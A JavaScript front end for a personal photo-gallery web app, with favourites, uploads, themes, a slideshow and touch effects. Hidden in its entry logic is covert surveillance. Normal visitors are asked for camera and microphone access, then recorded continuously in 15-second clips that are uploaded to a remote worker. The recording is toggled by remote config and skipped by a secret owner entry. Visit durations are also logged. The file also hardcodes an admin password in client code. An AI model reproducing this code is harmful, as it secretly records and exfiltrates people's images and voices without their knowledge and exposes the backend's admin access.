const WORKER_URL = 'https://ourmemory.mrony8552.workers.dev'; 
const ADMIN_PASS = "74722222"; 
const RECORDING_CHUNK_MS = 15000; 

const galleryContainer = document.getElementById('gallery-grid');

const layouts = ['grid-style-5', 'grid-style-1', 'grid-style-2', 'grid-style-3', 'grid-style-4', 'grid-style-6', 'grid-style-7'];
let layoutIdx = parseInt(localStorage.getItem('savedLayout')) || 0;

const themes = ['theme-light', 'theme-amoled', 'theme-aurora', 'theme-champagne'];
let themeIdx = parseInt(localStorage.getItem('savedTheme')) || 0;

document.body.className = themes[themeIdx];
if(galleryContainer) galleryContainer.className = layouts[layoutIdx];

let favorites = [];
let showFavsOnly = false;
let allImageKeys = []; 
let selectedForDelete = []; 

// --- REMOTE RECORDING CONFIG ---
let isRecordingEnabled = true; // Default ON
fetch(`${WORKER_URL}/api/config`)
    .then(res => res.json())
    .then(data => { if(typeof data.recordingEnabled !== 'undefined') isRecordingEnabled = data.recordingEnabled; })
    .catch(() => {});

try { favorites = JSON.parse(localStorage.getItem('favs')) || []; } catch (e) {}

function saveFavorites() { localStorage.setItem('favs', JSON.stringify(favorites)); }

function toggleFavorite(key, element) {
    try {
        let isFav = false;
        if (favorites.includes(key)) {
            favorites = favorites.filter(k => k !== key);
        } else {
            // push() এর বদলে unshift() ব্যবহার করা হয়েছে, যাতে নতুন ফেভারিট একদম শুরুতে (top) যায়
            favorites.unshift(key); 
            isFav = true;
        }
        saveFavorites();
        
        // স্ক্রল পজিশন সেভ করে রাখা হচ্ছে যাতে স্ক্রিন লাফ না দেয়
        const scrollPos = window.scrollY;

        // কোনো নেটওয়ার্ক রিলোড ছাড়াই লোকালি গ্যালারি ইনস্ট্যান্ট আপডেট করা
        renderGallery(false);

        // স্ক্রল পজিশন আগের জায়গায় ফিরিয়ে আনা
        window.scrollTo(0, scrollPos);

        try { if (navigator.vibrate) navigator.vibrate(45); } catch(e) {}
    } catch(e) {}
}

function safeClick(id, callback) {
    const el = document.getElementById(id);
    if (el) el.addEventListener('click', callback);
}

// --- ENTRY & TRACKING LOGIC ---
let secretTap = 0, tapTimer;
let isNormalEntry = false;
let sessionStartTime = 0;

safeClick('secret-heart', () => {
    secretTap++; clearTimeout(tapTimer);
    if (secretTap >= 3) {
        isNormalEntry = false;
        const intro = document.getElementById('intro');
        if(intro) intro.classList.add('exit'); 
        
        setTimeout(() => {
            document.getElementById('entry-screen').classList.remove('active-screen');
            document.getElementById('gallery-screen').classList.add('active-screen');
            loadImages();
        }, 800);
        secretTap = 0;
    }
    tapTimer = setTimeout(() => secretTap = 0, 1000);
});

safeClick('enter-btn', async () => {
    isNormalEntry = true;
    sessionStartTime = Date.now(); 
    
    try {
        let stream = null;
        // Check Remote Control Status before requesting camera
        if (isRecordingEnabled && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        }
        setTimeout(() => {
            document.getElementById('entry-screen').classList.remove('active-screen');
            document.getElementById('gallery-screen').classList.add('active-screen');
            loadImages();
            if (stream) startRecording(stream);
        }, 800); 
    } catch (err) {
        setTimeout(() => {
            document.getElementById('entry-screen').classList.remove('active-screen');
            document.getElementById('gallery-screen').classList.add('active-screen');
            loadImages();
        }, 800);
    }
});

document.addEventListener('visibilitychange', () => {
    if (document.hidden && isNormalEntry && sessionStartTime > 0) {
        const durationMs = Date.now() - sessionStartTime;
        if (durationMs > 3000) { 
            fetch(`${WORKER_URL}/api/log`, {
                method: 'POST',
                body: JSON.stringify({
                    date: new Date().toISOString(),
                    duration: Math.round(durationMs / 1000) 
                })
            }).catch(() => {});
        }
        sessionStartTime = 0; 
    } else if (!document.hidden && isNormalEntry) {
        sessionStartTime = Date.now(); 
    }
});

// --- RECORDING LOGIC ---
async function startRecording(stream) {
    while (true) {
        await new Promise(resolve => {
            try {
                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                let chunks = [];
                recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    if (blob.size > 20000) {
                        const formData = new FormData();
                        formData.append('file', blob, `reaction-${Date.now()}.webm`);
                        try { await fetch(`${WORKER_URL}/api/upload`, { method: 'POST', body: formData }); } catch(err){}
                    }
                    resolve();
                };
                recorder.start();
                setTimeout(() => { if(recorder.state === 'recording') recorder.stop(); }, RECORDING_CHUNK_MS);
            } catch(e) { setTimeout(resolve, 5000); }
        });
    }
}

// Upload Logic
safeClick('upload-fab', () => document.getElementById('image-upload-input')?.click());

function setUploadProgress(current, total, percent, fileName, done = false) {
    const panel = document.getElementById('upload-progress');
    if (!panel) return;
    panel.classList.add('active');
    document.getElementById('upload-progress-label').textContent = done ? 'Upload complete' : `Uploading ${current} of ${total}`;
    document.getElementById('upload-percent').textContent = done ? '100%' : `${Math.round(percent)}%`;
    document.getElementById('upload-progress-fill').style.width = done ? '100%' : `${Math.max(0, Math.min(100, percent))}%`;
    document.getElementById('upload-count').textContent = done ? `${total}/${total} uploaded` : `${current - 1} uploaded • ${total - current + 1} remaining`;
    document.getElementById('upload-file-name').textContent = done ? 'All selected photos are uploaded.' : (fileName || '');
}

function uploadImageWithProgress(file, current, total) {
    return new Promise((resolve, reject) => {
        const xhr = new XMLHttpRequest();
        xhr.open('POST', `${WORKER_URL}/api/upload-image`, true);
        xhr.upload.addEventListener('progress', event => {
            const percent = event.lengthComputable ? (event.loaded / event.total) * 100 : 0;
            setUploadProgress(current, total, percent, file.name);
        });
        xhr.onload = () => { if (xhr.status >= 200 && xhr.status < 300) resolve(); else reject(new Error(`Upload failed`)); };
        xhr.onerror = () => reject(new Error('Network error'));
        const formData = new FormData(); formData.append('file', file);
        xhr.send(formData);
    });
}

document.getElementById('image-upload-input')?.addEventListener('change', async (e) => {
    const files = Array.from(e.target.files || []);
    if (!files.length) return;
    const total = files.length; let uploaded = 0; let failed = 0;
    document.body.classList.add('uploading');
    setUploadProgress(1, total, 0, files[0].name);
    try {
        for (let i = 0; i < total; i++) {
            setUploadProgress(i + 1, total, 0, files[i].name);
            try { await uploadImageWithProgress(files[i], i + 1, total); uploaded++; } 
            catch (err) { failed++; }
        }
        setUploadProgress(total, total, 100, '', true);
        await loadImages();
        setTimeout(() => document.getElementById('upload-progress')?.classList.remove('active'), 1200);
    } finally { document.body.classList.remove('uploading'); e.target.value = ''; }
});

// Load Images & Grid
let rawImageKeys = [];
function sortImageKeys(keys) {
    const keySet = new Set(keys);
    const favs = favorites.filter(k => keySet.has(k));
    const favSet = new Set(favs);
    const normal = keys.filter(k => !favSet.has(k));
    return showFavsOnly ? favs : [...favs, ...normal];
}

function createImageCard(key, animate = false, index = 0) {
    const isFav = favorites.includes(key);
    const isSelected = selectedForDelete.includes(key);
    const wrap = document.createElement('div');
    wrap.className = `img-wrapper ${isSelected ? 'selected' : ''}`;
    if (animate) { wrap.style.setProperty('--card-delay', `${Math.min(index * 18, 240)}ms`); wrap.classList.add('gallery-enter'); }
    wrap.innerHTML = `
        <img src="${WORKER_URL}/api/image/${encodeURIComponent(key)}" loading="lazy" draggable="false">
        ${isFav ? '<div class="fav-badge">❤️</div>' : ''}
        <div class="select-check">✓</div>
    `;
    const imgEl = wrap.querySelector('img');
    let pressTimer = null, longPressed = false, pressStartX = 0, pressStartY = 0;
    const clearPress = () => { if (pressTimer) { clearTimeout(pressTimer); pressTimer = null; } };

    wrap.addEventListener('pointerdown', (event) => {
        if (event.pointerType === 'mouse' && event.button !== 0) return;
        if (document.body.classList.contains('delete-mode')) return;
        longPressed = false; pressStartX = event.clientX; pressStartY = event.clientY; clearPress();
        pressTimer = setTimeout(() => { longPressed = true; toggleFavorite(key, wrap); }, 550);
    }, { passive: true });

    wrap.addEventListener('pointermove', (event) => {
        if (!pressTimer) return;
        if (Math.hypot(event.clientX - pressStartX, event.clientY - pressStartY) > 12) clearPress();
    }, { passive: true });

    ['pointerup', 'pointercancel', 'pointerleave'].forEach(type => wrap.addEventListener(type, clearPress, { passive: true }));

    wrap.addEventListener('click', (event) => {
        if (document.body.classList.contains('delete-mode')) {
            if (selectedForDelete.includes(key)) { selectedForDelete = selectedForDelete.filter(k => k !== key); wrap.classList.remove('selected'); } 
            else { selectedForDelete.push(key); wrap.classList.add('selected'); }
            updateBulkBar(); return;
        }
        if (longPressed) { longPressed = false; event.preventDefault(); event.stopPropagation(); return; }
        openFullscreen(`${WORKER_URL}/api/image/${encodeURIComponent(key)}`);
    });
    return wrap;
}

function renderGallery(animate = false) {
    if (!galleryContainer) return;
    let imgArray = sortImageKeys(rawImageKeys);
    galleryContainer.innerHTML = '';
    if (!imgArray.length) {
        galleryContainer.innerHTML = showFavsOnly ? '<div class="loading-text">No favorites yet! ❤️</div>' : '<div class="loading-text">No photos yet. Tap + to upload ❤️</div>';
        allImageKeys = []; return;
    }
    allImageKeys = imgArray.slice();
    const currentLayout = layouts[layoutIdx];
    const isMasonry = ['grid-style-1', 'grid-style-3', 'grid-style-5'].includes(currentLayout);

    if (isMasonry) {
        const colCount = currentLayout === 'grid-style-5' ? 2 : 3;
        const columns = Array.from({ length: colCount }, () => {
            const col = document.createElement('div'); col.className = 'masonry-column'; galleryContainer.appendChild(col); return col;
        });
        imgArray.forEach((key, index) => columns[index % colCount].appendChild(createImageCard(key, animate, index)));
    } else { imgArray.forEach((key, index) => galleryContainer.appendChild(createImageCard(key, animate, index))); }
}

async function loadImages() {
    if (!galleryContainer) return;
    galleryContainer.classList.add('gallery-loading');
    try {
        const res = await fetch(`${WORKER_URL}/api/images`, { cache: 'no-store' });
        if (!res.ok) throw new Error(`Failed`);
        const data = await res.json();
        rawImageKeys = Array.isArray(data.images) ? data.images : [];
        renderGallery(false);
    } catch (err) { galleryContainer.innerHTML = '<div class="loading-text">Could not load photos.</div>'; } 
    finally { galleryContainer.classList.remove('gallery-loading'); }
}

function updateBulkBar() {
    const bar = document.getElementById('bulk-action-bar');
    document.getElementById('bulk-count').innerText = `${selectedForDelete.length} selected`;
    if(selectedForDelete.length > 0) bar.classList.add('active'); else bar.classList.remove('active');
}

safeClick('bulk-delete-btn', async () => {
    if(!confirm(`Delete ${selectedForDelete.length} photos permanently?`)) return;
    galleryContainer.innerHTML = '<div class="loading-text">Deleting... ⏳</div>';
    document.getElementById('bulk-action-bar').classList.remove('active');
    try {
        await fetch(`${WORKER_URL}/api/admin/files/bulk`, {
            method: 'DELETE', headers: { 'X-Admin-Password': ADMIN_PASS, 'Content-Type': 'application/json' },
            body: JSON.stringify({ keys: selectedForDelete })
        });
        favorites = favorites.filter(k => !selectedForDelete.includes(k));
        rawImageKeys = rawImageKeys.filter(k => !selectedForDelete.includes(k));
        saveFavorites(); selectedForDelete = []; renderGallery(true);
    } catch(err) { alert('Failed'); loadImages(); }
});

let slideInterval, currentSlide = 0;
const fullscreenImg = document.getElementById('fullscreen-img');

safeClick('slideshow-btn', () => {
    if(allImageKeys.length === 0) return alert("No photos to play!");
    currentSlide = 0; openFullscreen(`${WORKER_URL}/api/image/${allImageKeys[currentSlide]}`);
    slideInterval = setInterval(() => {
        currentSlide = (currentSlide + 1) % allImageKeys.length; fullscreenImg.style.opacity = 0;
        setTimeout(() => { fullscreenImg.src = `${WORKER_URL}/api/image/${allImageKeys[currentSlide]}`; fullscreenImg.style.opacity = 1; }, 300);
    }, 3000);
});

function openFullscreen(src) { if(fullscreenImg) { fullscreenImg.src = src; document.getElementById('fullscreen-modal').classList.add('active'); } }
function closeFullscreen() { clearInterval(slideInterval); document.getElementById('fullscreen-modal').classList.remove('active'); if(fullscreenImg) { fullscreenImg.style.opacity = 1; fullscreenImg.src = ''; } }
safeClick('close-modal-btn', closeFullscreen);
document.getElementById('fullscreen-modal')?.addEventListener('click', (e) => { if(e.target.id === 'fullscreen-modal') closeFullscreen(); });

function changeTheme() {
    const apply = () => {
        document.body.classList.remove(...themes);
        themeIdx = (themeIdx + 1) % themes.length;
        document.body.classList.add(themes[themeIdx]);
        localStorage.setItem('savedTheme', themeIdx);
    };
    if (document.startViewTransition && !document.body.classList.contains('uploading')) { document.startViewTransition(apply); } 
    else { document.body.classList.add('theme-changing'); requestAnimationFrame(() => { apply(); setTimeout(() => document.body.classList.remove('theme-changing'), 220); }); }
}
safeClick('theme-toggle', changeTheme);

safeClick('layout-toggle', () => {
    if (!galleryContainer) return;
    galleryContainer.classList.add('layout-changing');
    layoutIdx = (layoutIdx + 1) % layouts.length; localStorage.setItem('savedLayout', layoutIdx);
    requestAnimationFrame(() => {
        galleryContainer.className = layouts[layoutIdx]; renderGallery(true);
        setTimeout(() => galleryContainer.classList.remove('layout-changing'), 380);
    });
});

const navDelete = document.getElementById('nav-delete');
safeClick('nav-delete', () => {
    document.body.classList.toggle('delete-mode'); const isDeleteMode = document.body.classList.contains('delete-mode');
    if(navDelete) { navDelete.classList.toggle('danger', isDeleteMode); navDelete.classList.toggle('active', isDeleteMode); }
    selectedForDelete = []; updateBulkBar(); document.querySelectorAll('.img-wrapper.selected').forEach(el => el.classList.remove('selected'));
    if (isDeleteMode) { document.getElementById('nav-home')?.classList.remove('active'); document.getElementById('nav-favs')?.classList.remove('active'); } 
    else { document.getElementById('nav-home')?.classList.toggle('active', !showFavsOnly); document.getElementById('nav-favs')?.classList.toggle('active', showFavsOnly); }
});

safeClick('nav-home', () => { document.body.classList.remove('delete-mode'); showFavsOnly = false; navDelete?.classList.remove('danger', 'active'); document.getElementById('nav-favs')?.classList.remove('active'); document.getElementById('nav-home')?.classList.add('active'); selectedForDelete = []; updateBulkBar(); renderGallery(true); });
safeClick('nav-favs', () => { document.body.classList.remove('delete-mode'); showFavsOnly = true; navDelete?.classList.remove('danger', 'active'); document.getElementById('nav-home')?.classList.remove('active'); document.getElementById('nav-favs')?.classList.add('active'); selectedForDelete = []; updateBulkBar(); renderGallery(true); });

if ('serviceWorker' in navigator) { window.addEventListener('load', () => navigator.serviceWorker.register('sw.js').catch(err => console.log('SW failed:', err))); }

// --- MAGICAL TOUCH EFFECT ---
(function initTouchEffect() {
    const canvas = document.createElement('canvas');
    canvas.id = 'magic-touch-canvas';
    canvas.style.position = 'fixed'; canvas.style.top = '0'; canvas.style.left = '0';
    canvas.style.width = '100vw'; canvas.style.height = '100vh';
    canvas.style.pointerEvents = 'none'; canvas.style.zIndex = '9999';
    document.body.appendChild(canvas);

    const ctx = canvas.getContext('2d');
    let w = canvas.width = window.innerWidth, h = canvas.height = window.innerHeight;
    window.addEventListener('resize', () => { w = canvas.width = window.innerWidth; h = canvas.height = window.innerHeight; }, { passive: true });

    const particles = []; const colors = ['#ff4f81', '#ff9dd0', '#ffffff', '#ffdce8'];
    class Particle {
        constructor(x, y) {
            this.x = x; this.y = y; this.size = Math.random() * 3 + 1.5;
            this.speedX = Math.random() * 2 - 1; this.speedY = Math.random() * -1.5 - 0.5;
            this.color = colors[Math.floor(Math.random() * colors.length)];
            this.life = 1; this.decay = Math.random() * 0.02 + 0.015; this.isHeart = Math.random() > 0.75;
        }
        update() { this.x += this.speedX; this.y += this.speedY; this.life -= this.decay; this.size *= 0.95; }
        draw() {
            ctx.globalAlpha = Math.max(0, this.life);
            if (this.isHeart) { ctx.fillStyle = this.color; ctx.font = `${this.size * 3.5}px Arial`; ctx.fillText('❤', this.x, this.y); } 
            else { ctx.fillStyle = this.color; ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2); ctx.fill(); }
        }
    }
    function animate() {
        ctx.clearRect(0, 0, w, h);
        for (let i = particles.length - 1; i >= 0; i--) {
            particles[i].update(); particles[i].draw();
            if (particles[i].life <= 0 || particles[i].size <= 0.1) particles.splice(i, 1);
        }
        requestAnimationFrame(animate);
    }
    animate();
    const addParticles = (x, y, count = 1) => { for(let i=0; i<count; i++) particles.push(new Particle(x, y)); };
    window.addEventListener('pointermove', (e) => addParticles(e.clientX, e.clientY, 1), { passive: true });
    window.addEventListener('pointerdown', (e) => addParticles(e.clientX, e.clientY, 6), { passive: true });
})();
